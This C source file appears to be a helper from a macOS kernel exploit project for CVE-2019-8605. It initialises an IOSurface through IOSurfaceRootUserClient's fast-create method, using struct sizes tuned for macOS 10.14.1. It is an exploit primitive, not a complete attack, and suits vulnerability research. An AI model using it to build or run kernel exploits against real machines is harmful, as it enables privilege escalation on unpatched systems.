#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <mach/mach.h>

#include "helper.h"
#include "iokit.h"
#include "exp.h"

struct _IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

// macOS 10.14.1; varies with version
// tip: find bzero's a2 arguments from IOSurfaceClient::getLockResult
#define IOSURFACE_CREATE_OUTSIZE 0x8d0 


struct IOSurfaceLockResult {
    uint64_t addr1;
    uint64_t addr2;
    uint64_t addr3;
    uint32_t surface_id;
    uint8_t _pad2[IOSURFACE_CREATE_OUTSIZE-0x18-0x4];
};

// The ID of the IOSurface we're using.
uint32_t IOSurface_id;

// Is the IOSurface subsystem initialized?
static bool IOSurface_initialized;

// The IOSurfaceRoot service.
mach_port_t IOSurfaceRoot;

// An IOSurfaceRootUserClient instance.
mach_port_t IOSurfaceRootUserClient;


bool
IOSurface_init() {
    if (IOSurface_initialized) {
		return true;
	}

    IOSurfaceRoot = IOServiceGetMatchingService(
        kIOMasterPortDefault,
        IOServiceMatching("IOSurfaceRoot"));

    if (IOSurfaceRoot == MACH_PORT_NULL) {
        ERROR("Couldn't find IOSurfaceRoot\n");
        return false;
    }

    kern_return_t kr = IOServiceOpen(
        IOSurfaceRoot,
        mach_task_self(),
        0,
        &IOSurfaceRootUserClient);
    if(kr != KERN_SUCCESS) {
        ERROR("Couldn't open IOSurfaceRootUserClient, kr=0x%x\n", kr);
        return false;
    }

    //seos-iMac-Pro:CVE-2019-8605 seo$ sysctl hw.pagesize
    //hw.pagesize: 4096
    struct _IOSurfaceFastCreateArgs create_args = { 
        .alloc_size = 4096};
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);

    // IOSurfaceRootUserClient::externalMethod
    //-> IOUserClient::externalMethod
    // ... -> IOSurfaceRootUserClient::s_create_surface_fast_path
    kr = IOConnectCallMethod(
        IOSurfaceRootUserClient,
        6, //IOSurfaceRootUserClient::s_create_surface_fast_path
        NULL, 0,
        &create_args, sizeof(create_args),
        NULL, NULL,
        &lock_result, &lock_result_size
    );
    if(kr != KERN_SUCCESS) {
        ERROR("Failed to call create_surface_client_fast_path, kr=0x%x\n", kr);
        return false;
    }
    IOSurface_id = lock_result.surface_id;
    IOSurface_initialized = true;
    INFO("IOSurface_init success, IOSurface_id=0x%x\n", IOSurface_id);
    return true;
}
